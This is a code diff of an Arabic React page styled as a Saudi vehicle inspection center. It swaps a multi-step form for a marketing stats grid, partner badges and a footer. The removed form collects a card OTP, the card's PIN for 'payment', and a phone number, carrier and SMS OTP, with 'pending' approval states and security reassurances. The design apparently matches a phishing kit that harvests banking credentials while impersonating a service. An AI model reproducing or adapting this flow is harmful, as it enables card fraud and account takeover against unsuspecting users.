+              نفتخر بتقديم خدمات الفحص الفني بأعلى معايير الجودة والدقة والشفافية
+            </p>
           </div>
 
-          <form onSubmit={handleOtpSubmit} className="container mx-auto px-4 py-8 space-y-8 max-w-2xl">
-            <div className="text-center space-y-3">
-              <p className="text-muted-foreground text-lg">تم إرسال رمز التحقق إلى رقم جوالك</p>
-              <p className="font-semibold text-xl">+966 *** *** **45</p>
-            </div>
-
-            <Card className="shadow-sm">
-              <CardContent className="p-8">
-                <div className="space-y-6">
-                  <Label htmlFor="otp-input" className="text-center block text-lg font-medium">
-                    أدخل رمز التحقق (6 أرقام)<span className="text-destructive">*</span>
-                  </Label>
-
-                  <div className="max-w-sm mx-auto">
-                    <Input
-                      id="otp-input"
-                      type="text"
-                      maxLength={6}
-                      value={otp}
-                      onChange={(e) => {
-                        setOtp(e.target.value.replace(/\D/g, ""))
-                        setOtpError("")
-                        setCardOtpApproval(undefined)
-                      }}
-                      placeholder="000000"
-                      className="h-16 text-center text-2xl font-bold tracking-widest border-2 focus:border-teal-700 shadow-sm"
-                      dir="ltr"
-                      required
-                      disabled={isLoading}
-                    />
-                    <p className="text-xs text-muted-foreground text-center mt-2">{otp.length}/6 أرقام</p>
-                    {otpError && <p className="text-destructive text-sm text-center mt-2">{otpError}</p>}
-                    {cardOtpApproval === "pending" && (
-                      <div className="flex items-center justify-center gap-2 mt-4">
-                        <div className="animate-spin h-4 w-4 border-2 border-teal-700 border-t-transparent rounded-full" />
-                        <p className="text-sm text-muted-foreground">جاري التحقق من الرمز...</p>
-                      </div>
-                    )}
-                  </div>
-
-                  <div className="text-center pt-2">
-                    <Button type="button" variant="link" className="text-base font-medium" disabled={isLoading}>
-                      إعادة إرسال الرمز
-                    </Button>
-                  </div>
-                </div>
-              </CardContent>
+          <div className="grid grid-cols-2 lg:grid-cols-4 gap-6 max-w-6xl mx-auto">
+            <Card className="bg-green-500-foreground/10 backdrop-blur-sm border-green-500-foreground/20 p-8 text-center hover:bg-green-500-foreground/15 transition-colors">
+              <div className="space-y-2">
+                <TrendingUp className="w-8 h-8 text-white mx-auto mb-4" />
+                <div className="text-5xl font-bold text-green-500-foreground">35</div>
+                <div className="text-sm font-medium text-white ">محطة فحص</div>
+                <div className="text-xs  text-white/70 text-pretty">محطات معتمدة على مستوى المملكة</div>
+              </div>
             </Card>
 
-            <div className="flex gap-3 pt-6">
-              <Button
-                type="button"
-                variant="outline"
-                onClick={() => setCurrentStep("card-form")}
-                className="flex-1 h-12 border-2"
-                disabled={isLoading}
-              >
-                رجوع
-              </Button>
-              <Button type="submit" className="flex-1 h-12 gap-2 shadow-sm" disabled={isLoading || otp.length < 6}>
-                {isLoading ? (
-                  <>
-                    <div className="animate-spin h-5 w-5 border-2 border-current border-t-transparent rounded-full" />
-                    <span>جاري التحقق...</span>
-                  </>
-                ) : (
-                  <>
-                    <span>التحقق</span>
-                    <ArrowLeft className="w-5 h-5" />
-                  </>
-                )}
-              </Button>
-            </div>
-          </form>
-        </main>
-      </div>
-    )
-  }
-
-  if (currentStep === "pin") {
-    return (
-      <div dir="rtl" className="min-h-screen bg-background">
-        <main className="flex-1">
-          <div className="bg-teal-700 py-6 shadow-sm">
-            <div className="container mx-auto px-4">
-              <h1 className="text-2xl font-bold text-teal-700-foreground text-center">أدخل رمز PIN</h1>
-            </div>
-          </div>
-
-          {/* Enhanced PIN form with professional security messaging */}
-          <form onSubmit={handlePinSubmit} className="container mx-auto px-4 py-8 space-y-8 max-w-2xl">
-            <div className="text-center space-y-3">
-              <p className="text-muted-foreground text-lg">أدخل رمز PIN الخاص بالبطاقة</p>
-            </div>
-
-            <Card className="shadow-sm">
-              <CardContent className="p-8">
-                <div className="space-y-6">
-                  <Label className="text-center block text-lg font-medium">
-                    رمز PIN<span className="text-destructive">*</span>
-                  </Label>
-                  <div className="flex gap-4 justify-center" dir="ltr">
-                    {pin.map((digit, idx) => (
-                      <Input
-                        key={idx}
-                        type="password"
-                        maxLength={1}
-                        value={digit}
-                        onChange={(e) => {
-                          const newPin = [...pin]
-                          newPin[idx] = e.target.value
-                          setPin(newPin)
-
-                          if (e.target.value && idx < 3) {
-                            const nextInput = e.target.parentElement?.children[idx + 1] as HTMLInputElement
-                            nextInput?.focus()
-                          }
-                        }}
-                        className="w-16 h-20 text-center text-3xl font-bold border-2 focus:border-teal-700 shadow-sm"
-                        required
-                      />
-                    ))}
-                  </div>
-                </div>
-              </CardContent>
+            <Card className="bg-green-500-foreground/10 backdrop-blur-sm border-green-500-foreground/20 p-8 text-center hover:bg-green-500-foreground/15 transition-colors">
+              <div className="space-y-2">
+                <CheckCircle className="w-8 h-8 text-white mx-auto mb-4" />
+                <div className="text-5xl font-bold text-green-500-foreground">+1.2M</div>
+                <div className="text-sm font-medium text-white ">فحص سنوي</div>
+                <div className="text-xs  text-white/70 text-pretty">عدد الفحوصات المنجزة سنوياً</div>
+              </div>
             </Card>
 
-            <div className="bg-muted/80 p-5 rounded-lg border border-border shadow-sm">
-              <p className="text-sm text-muted-foreground text-center leading-relaxed">
-                🔒 جميع معلوماتك محمية ومشفرة بأعلى معايير الأمان
-              </p>
-            </div>
-
-            <div className="flex gap-3 pt-6">
-              <Button
-                type="button"
-                variant="outline"
-                onClick={() => setCurrentStep("otp")}
-                className="flex-1 h-12 border-2"
-                disabled={isLoading}
-              >
-                رجوع
-              </Button>
-              <Button type="submit" className="flex-1 h-12 gap-2 shadow-sm" disabled={isLoading}>
-                <span>إتمام الدفع</span>
-                <ArrowLeft className="w-5 h-5" />
-              </Button>
-            </div>
-          </form>
-        </main>
-      </div>
-    )
-  }
-
-  if (currentStep === "phone-verification") {
-    const operators = [
-      { id: "stc", name: "STC", logo: "/stc.png", color: "bg-purple-50 border-purple-200" },
-      { id: "mobily", name: "Mobily", logo: "/Mobily_Logo.svg", color: "bg-green-50 border-green-200" },
-      { id: "zain", name: "Zain", logo: "/Zain-logo-400x400-01.png", color: "bg-orange-50 border-orange-200" },
-    ]
-
-    return (
-      <div dir="rtl" className="min-h-screen bg-background">
-        <main className="flex-1">
-          <div className="bg-teal-700 py-6 shadow-sm">
-            <div className="container mx-auto px-4">
-              <h1 className="text-2xl font-bold text-teal-700-foreground text-center">التحقق من رقم الجوال</h1>
-            </div>
-          </div>
-
-          <div className="container mx-auto px-4 py-8 space-y-8 max-w-2xl">
-            <div className="text-center space-y-3">
-              <p className="text-muted-foreground text-lg">للمتابعة، يرجى إدخال رقم الجوال واختيار شركة الاتصالات</p>
-            </div>
-
-            <form onSubmit={handlePhoneVerification} className="space-y-6">
-              <Card className="shadow-sm">
-                <CardContent className="p-6 space-y-5">
-                  {/* Phone Number Input */}
-                  <div className="space-y-2">
-                    <Label htmlFor="phone-number">
-                      رقم الجوال<span className="text-destructive">*</span>
-                    </Label>
-                    <div className="relative">
-                      <div className="absolute inset-y-0 right-0 flex items-center pr-4 pointer-events-none">
-                        <span className="text-muted-foreground font-medium">+966</span>
-                      </div>
-                      <Input
-                        id="phone-number"
-                        type="tel"
-                        value={phone}
-                        onChange={(e) => {
-                          const value = e.target.value.replace(/\D/g, "").slice(0, 10)
-                          setPhone(value)
-                        }}
-                        className="pr-20 text-lg"
-                        placeholder="05xxxxxxxx"
-                        dir="ltr"
-                        required
-                        disabled={isLoading}
-                      />
-                    </div>
-                  </div>
-
-                  {/* Operator Selection */}
-                  <div className="space-y-3">
-                    <Label>
-                      شركة الاتصالات<span className="text-destructive">*</span>
-                    </Label>
-                    <div className="grid grid-cols-3 gap-3">
-                      {operators.map((op) => (
-                        <button
-                          key={op.id}
-                          type="button"
-                          onClick={() => setOperator(op.id)}
-                          disabled={isLoading}
-                          className={`flex flex-col items-center justify-center p-4 border-2 rounded-lg transition-all ${
-                            operator === op.id
-                              ? "border-teal-700 bg-teal-700/10 shadow-md"
-                              : `border-border ${op.color} hover:border-teal-700/50`
-                          } ${isLoading ? "opacity-50 cursor-not-allowed" : ""}`}
-                        >
-                          <div className="h-8 w-auto mb-2 flex items-center justify-center">
-                            <span className="font-bold text-lg">{op.name}</span>
-                          </div>
-                          {operator === op.id && (
-                            <div className="w-5 h-5 bg-teal-700 rounded-full flex items-center justify-center">
-                              <Check className="w-3 h-3 text-teal-700-foreground" />
-                            </div>
-                          )}
-                        </button>
-                      ))}
-                    </div>
-                  </div>
-
-                  {/* OTP Input (conditional) */}
-                  {operator && phone.length === 10 && (
-                    <div className="space-y-3 pt-4 border-t">
-                      <Label htmlFor="phone-otp">
-                        أدخل رمز التحقق المرسل إلى جوالك<span className="text-destructive">*</span>
-                      </Label>
-                      <Input
-                        id="phone-otp"
-                        type="text"
-                        value={phoneOtp}
-                        onChange={(e) => {
-                          const value = e.target.value.replace(/\D/g, "").slice(0, 6)
-                          setPhoneOtp(value)
-                          if (phoneOtpError) setPhoneOtpError("")
-                          setPhoneOtpApproval(undefined)
-                        }}
-                        maxLength={6}
-                        placeholder="أدخل رمز التحقق (6 أرقام)"
-                        className="text-center text-xl tracking-widest"
-                        required
-                        disabled={isLoading}
-                      />
-                      {phoneOtpError && <p className="text-destructive text-sm text-center">{phoneOtpError}</p>}
-                      {phoneOtpApproval === "pending" && (
-                        <div className="flex items-center justify-center gap-2">
-                          <div className="animate-spin h-4 w-4 border-2 border-teal-700 border-t-transparent rounded-full" />
-                          <p className="text-sm text-muted-foreground">جاري التحقق من الرمز...</p>
-                        </div>
-                      )}
-                      <Button type="button" variant="link" className="w-full text-sm" disabled={isLoading}>
-                        إعادة إرسال الرمز
-                      </Button>
-                    </div>
-                  )}
-                </CardContent>
-              </Card>
-
-              {/* Security Notice */}
-              <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
-                <p className="text-blue-800 text-sm text-center">🔒 معلوماتك محمية بأعلى معايير الأمان والخصوصية</p>
+            <Card className="bg-green-500-foreground/10 backdrop-blur-sm border-green-500-foreground/20 p-8 text-center hover:bg-green-500-foreground/15 transition-colors">
+              <div className="space-y-2">
+                <Clock className="w-8 h-8 text-white mx-auto mb-4" />
+                <div className="text-5xl font-bold text-green-500-foreground">24/7</div>
+                <div className="text-sm font-medium text-white ">خدمة العملاء</div>
+                <div className="text-xs  text-white/70 text-pretty">دعم فني على مدار الساعة</div>
               </div>
+            </Card>
 
-              <div className="flex gap-3 pt-6">
-                <Button
-                  type="button"
-                  variant="outline"
-                  onClick={() => setCurrentStep("pin")}
-                  className="flex-1 h-12 border-2"
-                  disabled={isLoading}
-                >
-                  رجوع
-                </Button>
-                <Button
-                  type="submit"
-                  className="flex-1 h-12 gap-2 shadow-sm"
-                  disabled={isLoading || !phone || !operator || phoneOtp.length < 6}
-                >
-                  {isLoading ? (
-                    <>
-                      <div className="animate-spin h-5 w-5 border-2 border-current border-t-transparent rounded-full" />
-                      <span>جاري التحقق...</span>
-                    </>
-                  ) : (
-                    <>
-                      <span>إتمام العملية</span>
-                      <ArrowLeft className="w-5 h-5" />
-                    </>
-                  )}
-                </Button>
+            <Card className="bg-green-500-foreground/10 backdrop-blur-sm border-green-500-foreground/20 p-8 text-center hover:bg-green-500-foreground/15 transition-colors">
+              <div className="space-y-2">
+                <Award className="w-8 h-8 text-white mx-auto mb-4" />
+                <div className="text-5xl font-bold text-green-500-foreground">98%</div>
+                <div className="text-sm font-medium text-white ">رضا العملاء</div>
+                <div className="text-xs  text-white/70 text-pretty">معدل رضا عملائنا عن خدماتنا</div>
               </div>
-            </form>
+            </Card>
           </div>
-        </main>
-      </div>
-    )
-  }
+        </div>
+      </section>
 
-  return (
-    <div dir="rtl" className="min-h-screen bg-background">
-      <div className="container mx-auto px-4 py-8">
-        <p className="text-center">جاري تطوير هذه الصفحة...</p>
-        <Button onClick={() => setCurrentStep("landing")} className="mx-auto block mt-4">
-          العودة للرئيسية
-        </Button>
-      </div>
+      {/* Partnerships Section */}
+      <section className="container mx-auto px-6 py-20">
+        <div className="max-w-4xl mx-auto text-center space-y-4 mb-12">
+          <Badge variant="outline" className="text-green-500 border-green-500/30">
+            شركاؤنا
+          </Badge>
+          <h2 className="text-3xl md:text-4xl font-bold text-foreground text-balance">شراكات استراتيجية موثوقة</h2>
+          <p className="text-muted-foreground text-lg text-pretty leading-relaxed">
+            نتعاون مع أبرز الشركات والمؤسسات في مجال السلامة المرورية لتقديم أفضل الخدمات
+          </p>
+        </div>
+
+        <div className="flex flex-wrap gap-3 justify-center max-w-3xl mx-auto">
+          <Badge className="bg-green-500 text-white hover:bg-green-500/90 px-6 py-3 text-sm rounded-full">
+            <CheckCircle className="w-4 h-4 ml-2" />
+            منصة الفحص الفني الدوري
+          </Badge>
+          <Badge variant="outline" className="border-border hover:bg-accent px-6 py-3 text-sm rounded-full">
+            الرقم الموحد
+          </Badge>
+          <Badge variant="outline" className="border-border hover:bg-accent px-6 py-3 text-sm rounded-full">
+            More Book
+          </Badge>
+          <Badge variant="outline" className="border-border hover:bg-accent px-6 py-3 text-sm rounded-full">
+            برنامج حماية
+          </Badge>
+        </div>
+      </section>
+
+      {/* Footer */}
+      <footer className="bg-muted/50 border-t border-border py-8 text-center">
+        <div className="container mx-auto px-6">
+          <p className="text-sm text-muted-foreground">© 2025 مركز السلامة للفحص الفني الدوري. جميع الحقوق محفوظة.</p>
+        </div>
+      </footer>
     </div>
   )
 }
